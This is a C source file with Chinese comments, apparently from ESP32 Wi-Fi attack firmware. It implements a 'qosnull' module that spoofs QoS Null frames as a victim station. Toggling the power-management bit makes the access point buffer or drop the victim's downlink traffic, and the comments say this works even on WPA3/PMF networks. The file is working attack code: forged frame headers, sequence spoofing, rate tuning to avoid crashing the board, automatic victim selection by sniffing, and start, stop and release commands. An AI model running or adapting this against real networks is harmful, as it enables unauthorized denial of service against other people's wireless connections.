// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// QoS Null PM 位欺骗：冒充受害者给 AP 回一个单播 QoS Null，把 AP 对该站的省电状态
// 拨到我们手里。PM=1 是"我要睡了，下行先缓存"，PM=0 是"我醒了，把缓存的发过来"。
// 帧本身不用密钥，PMF 也不管数据帧的 PM 位，所以 WPA3 网络上照样成立。
//
// 做不到的事：AP 会把缓存的帧老化丢掉，受害者自己每个上行帧都带 PM=0 又把状态拨回去，
// 效果是下行劣化/丢包，不是永久阻断。

#include <stdio.h>
#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wtarget/wtarget.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#define OWNER "qosnull"
// 10 帧/秒。这类短帧在 20 帧/秒下几百帧就把 32 个帧池抽干，整板重启。
#define REPEAT_MS 100
// 每这么多个帧插一个 PM=0，把"延迟"变成"丢包"
#define FLUSH_EVERY 6

static bool s_active;
static bool s_rx_on;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static uint8_t s_tid;
static uint8_t s_sta[6];
static bool s_have_sta;
static uint32_t s_cursor;
static uint32_t s_last_tx_ms;
static uint32_t s_tick;
static uint16_t s_seq;
static uint32_t s_frames;
static uint32_t s_pm1;
static uint32_t s_pm0;
static uint32_t s_dl;

static int build_qos_null(uint8_t *buf, size_t cap, const uint8_t sta[6], bool pm) {
    // ToDS：Addr1 = RA = AP，Addr2 = TA = 被冒充的站，Addr3 = DA = AP
    const int len = wf_build_null_data(buf, cap, s_bssid, sta, s_bssid, true, pm);
    if (len <= 0) {
        return -1;
    }
    // 组帧函数把序号清 0，逐帧递增，免得被重复检测丢掉
    const uint16_t seq = s_seq++ & 0x0FFF;
    buf[22] = (uint8_t)(seq >> 4);
    buf[23] = (uint8_t)((seq & 0x0F) << 4);
    buf[24] = (uint8_t)(s_tid & 0x0F);
    return len;
}

// 只认发往受害者的下行数据帧：还在发就说明 PM 状态没生效
static void on_rx(const uint8_t *frame, uint16_t len, const hal_wifi_rx_meta_t *meta, void *ctx) {
    (void)meta;
    (void)ctx;
    const uint8_t type = (uint8_t)((frame[0] >> 2) & 0x03);
    if (!s_active || type != 2 || len < 24) {
        return;
    }
    if (!s_have_sta || memcmp(frame + 4, s_sta, 6) != 0) {
        return;
    }
    s_dl++;
}

// 候选 STA 只在 tick 里用一下，放栈上：CYD 的 DRAM 已经贴边，常驻表能省就省。
#define CANDIDATE_MAX 8

static esp_err_t send_one(const uint8_t sta[6], bool pm) {
    uint8_t frame[64];
    const int len = build_qos_null(frame, sizeof(frame), sta, pm);
    if (len <= 0) {
        return ESP_FAIL;
    }
    const esp_err_t err = hal_wifi_tx(frame, (uint16_t)len);
    if (err != ESP_OK) {
        return err;
    }
    s_frames++;
    if (pm) {
        s_pm1++;
    } else {
        s_pm0++;
    }
    return ESP_OK;
}

static void qosnull_tick(uint32_t now_ms) {
    if (!s_active) {
        return;
    }
    if (s_last_tx_ms != 0 && (uint32_t)(now_ms - s_last_tx_ms) < REPEAT_MS) {
        return;
    }
    uint8_t stas[CANDIDATE_MAX][6];
    const uint8_t *sta = s_sta;
    if (!s_have_sta) {
        const size_t n = attack_sta_on_channel(s_channel, stas, CANDIDATE_MAX);
        if (n == 0) {
            return;
        }
        sta = stas[s_cursor % n];
    }
    s_last_tx_ms = now_ms;
    s_tick++;
    const bool pm = (s_tick % FLUSH_EVERY) != 0;
    if (send_one(sta, pm) == ESP_OK && !s_have_sta) {
        s_cursor++;
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "sta", .type = WB_T_MAC, .required = false},
    {.name = "tid", .type = WB_T_U32, .required = false, .min = 0, .max = 15, .def = 0},
};

static esp_err_t qosnull_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_tid = (uint8_t)wb_args_u32(args, "tid");
    s_have_sta = wb_args_mac(args, "sta", s_sta);
    s_cursor = 0;
    s_last_tx_ms = 0;
    s_tick = 0;
    s_seq = 0;
    s_frames = 0;
    s_pm1 = 0;
    s_pm0 = 0;
    s_dl = 0;

    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    if (!s_rx_on && hal_wifi_sniffer_enable(true) == ESP_OK &&
        hal_wifi_rx_subscribe(on_rx, NULL) == ESP_OK) {
        s_rx_on = true;
    }
    s_active = true;
    attack_emit("qosnull", true, "ch=%u", (unsigned)s_channel);
    wb_reply_line(reply, "qosnull 开跑 ch=%u tid=%u 受害者=%s 节奏=%ums rx=%d",
                  (unsigned)s_channel, (unsigned)s_tid, s_have_sta ? "指定" : "嗅探学习",
                  (unsigned)REPEAT_MS, s_rx_on ? 1 : 0);
    return ESP_OK;
}

static void qosnull_release(void) {
    if (!s_have_sta) {
        // 没钉受害者就不知道要给谁补 PM=0，只能记一笔
        return;
    }
    for (int attempt = 0; attempt < 4; attempt++) {
        if (send_one(s_sta, false) == ESP_OK) {
            return;
        }
        vTaskDelay(pdMS_TO_TICKS(25));
    }
}

static void qosnull_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    if (s_rx_on) {
        hal_wifi_rx_unsubscribe(on_rx);
        s_rx_on = false;
    }
    attack_unpin(OWNER);
    attack_emit("qosnull", false, NULL);
}

static esp_err_t qosnull_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t pm1 = s_pm1;
    const uint32_t pm0 = s_pm0;
    const uint32_t dl = s_dl;
    qosnull_stop();
    attack_report_rate(reply, "qosnull", frames);
    wb_reply_line(reply, "pm1=%u pm0=%u dl=%u", (unsigned)pm1, (unsigned)pm0, (unsigned)dl);
    return ESP_OK;
}

static esp_err_t qosnull_release_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t before = s_pm0;
    qosnull_release();
    const uint32_t flushed = s_pm0 - before;
    if (flushed > 0) {
        qosnull_stop();
        wb_reply_line(reply, "已补 PM=0，受害者被 AP 缓存的帧会冲出来");
    } else {
        qosnull_stop();
        wb_reply_line(reply, "没补上：start 的时候没钉 sta=");
    }
    return ESP_OK;
}

static esp_err_t qosnull_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    static const uint8_t kSta[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    static const uint8_t kAp[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x66};
    const bool had_bssid = (s_bssid[0] | s_bssid[1] | s_bssid[2]) != 0;
    uint8_t saved[6];
    memcpy(saved, s_bssid, 6);
    if (!had_bssid) {
        memcpy(s_bssid, kAp, 6);
    }
    uint8_t frame[64];
    for (int pm = 1; pm >= 0; pm--) {
        const int len = build_qos_null(frame, sizeof(frame), kSta, pm != 0);
        if (len <= 0) {
            memcpy(s_bssid, saved, 6);
            wb_reply_fail(reply, "组帧失败");
            return ESP_FAIL;
        }
        wb_reply_line(reply, "pm=%u len=%d fc=0x%02X%02X tid=%u ra=%02X:%02X:%02X", (unsigned)pm,
                      len, (unsigned)frame[1], (unsigned)frame[0], (unsigned)(frame[24] & 0x0F),
                      frame[4], frame[5], frame[6]);
        char hex[3 * 64 + 1];
        size_t pos = 0;
        for (int i = 0; i < len && pos + 3 < sizeof(hex); i++) {
            pos += (size_t)snprintf(hex + pos, sizeof(hex) - pos, "%02X", frame[i]);
        }
        wb_reply_line(reply, "hex=%s", hex);
    }
    memcpy(s_bssid, saved, 6);
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", qosnull_start, "idx=1..64 [sta=mac] [tid=0..15]", kStartPolicy,
     sizeof(kStartPolicy) / sizeof(kStartPolicy[0])},
    {"stop", qosnull_stop_cmd, "", NULL, 0},
    {"release", qosnull_release_cmd, "", NULL, 0},
    {"test", qosnull_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "qosnull",
    .title = "QoS Null",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t qosnull_frames(void) {
    return s_frames;
}

static bool qosnull_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "qosnull",
    .object = &kObject,
    .stop = qosnull_stop,
    .tick = qosnull_tick,
    .frames = qosnull_frames,
    .active = qosnull_active,
};

const attack_driver_t *qosnull_attack(void) {
    return &kDriver;
}
